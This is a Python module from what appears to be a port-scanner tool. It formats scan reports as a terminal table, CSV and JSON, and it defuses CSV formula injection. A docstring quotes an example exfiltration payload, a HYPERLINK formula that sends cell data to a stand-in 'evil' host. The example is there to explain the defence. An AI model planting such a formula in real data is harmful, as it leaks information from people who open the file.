"""Render scan reports: a terminal table, CSV and JSON.

The scanner produces plain data (ScanReport / PortResult dataclasses) and
this module turns that data into formats. Keeping formatting out of the
scanner means a new format never touches network code.

Each format suits a different reader:
  * table: a human at a terminal
  * CSV:   a spreadsheet, or tools like grep/awk; one row per open port
  * JSON:  other programs; nested, typed, with scan metadata
"""

from __future__ import annotations

import csv
import json
from dataclasses import asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterable

from . import __version__
from .scanner import CLOSED, FILTERED, OPEN, ScanReport

CSV_FIELDS = ["target", "ip", "port", "protocol", "state", "service", "method", "banner"]

# Spreadsheets treat a cell starting with these characters as a formula.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _counts(report: ScanReport) -> dict[str, int]:
    states = [r.state for r in report.results]
    return {s: states.count(s) for s in (OPEN, CLOSED, FILTERED)}


# --------------------------------------------------------------------------
# Terminal table
# --------------------------------------------------------------------------

def format_table(report: ScanReport) -> str:
    """Render one host's open ports as an aligned text table.

    Column widths come from the data itself (the widest cell in each
    column), so the table stays aligned whatever the banners contain.
    """
    rows = [
        (
            f"{r.port}/tcp",
            r.state,
            # A trailing "?" marks a guess from the port number, as in Nmap.
            (r.service or "") + ("?" if r.method == "port" else ""),
            r.banner,
        )
        for r in report.results
        if r.state == OPEN
    ]
    lines = [f"Scan report for {report.target} ({report.ip})"]
    if rows:
        header = ("PORT", "STATE", "SERVICE", "BANNER")
        widths = [max(len(row[i]) for row in [header, *rows]) for i in range(4)]
        rule = "+" + "+".join("-" * (w + 2) for w in widths) + "+"

        def line(cells: tuple[str, ...]) -> str:
            return "| " + " | ".join(c.ljust(w) for c, w in zip(cells, widths)) + " |"

        lines += [rule, line(header), rule, *map(line, rows), rule]
    else:
        lines.append("No open ports found.")

    c = _counts(report)
    lines.append(
        f"Scanned {len(report.results)} ports in {report.elapsed:.2f}s "
        f"({c[OPEN]} open, {c[CLOSED]} closed, {c[FILTERED]} filtered)"
        + (" [interrupted, partial results]" if report.interrupted else "")
    )
    return "\n".join(lines)


# --------------------------------------------------------------------------
# CSV
# --------------------------------------------------------------------------

def _csv_safe(value: object) -> object:
    """Defuse CSV (formula) injection.

    Banners come from the scanned machine. If one starts with "=", for
    example =HYPERLINK("http://evil/?"&A1,"click"), Excel or LibreOffice
    would run it as a formula when an analyst opens the CSV. That can leak
    data or trick the reader. Prefixing a single quote makes the
    spreadsheet show the text literally (OWASP's recommended fix).
    """
    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def write_csv(reports: Iterable[ScanReport], path: str | Path) -> int:
    """Write one row per open port across all hosts. Returns the row count."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    rows = 0
    # newline="" is required by the csv module: it writes its own \r\n
    # line endings, and without it Windows would add blank lines.
    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        writer.writeheader()
        for report in reports:
            for r in report.results:
                if r.state != OPEN:
                    continue
                row = {
                    "target": report.target, "ip": report.ip, "port": r.port,
                    "protocol": "tcp", "state": r.state, "service": r.service,
                    "method": r.method, "banner": r.banner,
                }
                writer.writerow({k: _csv_safe(v) for k, v in row.items()})
                rows += 1
    return rows


# --------------------------------------------------------------------------
# JSON
# --------------------------------------------------------------------------

def to_json_dict(reports: Iterable[ScanReport], settings: dict | None = None) -> dict:
    """Build the JSON document as plain dicts and lists.

    Metadata (tool version, time, settings) makes results reproducible:
    someone reading the file later knows exactly how it was produced.
    Timestamps are UTC in ISO 8601, so they sort and compare correctly
    across time zones.
    """
    hosts = []
    for report in reports:
        hosts.append({
            "target": report.target,
            "ip": report.ip,
            "started_at": report.started_at,
            "elapsed_seconds": round(report.elapsed, 3),
            "interrupted": report.interrupted,
            "ports_scanned": len(report.results),
            "summary": _counts(report),
            # asdict() turns each PortResult dataclass into a dict.
            "open_ports": [asdict(r) for r in report.results if r.state == OPEN],
        })
    return {
        "scanner": "portscanner",
        "version": __version__,
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "settings": settings or {},
        "hosts": hosts,
    }


def write_json(
    reports: Iterable[ScanReport], path: str | Path, settings: dict | None = None
) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    doc = to_json_dict(reports, settings)
    # ensure_ascii=False keeps any non-ASCII text readable; indent for humans.
    path.write_text(json.dumps(doc, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
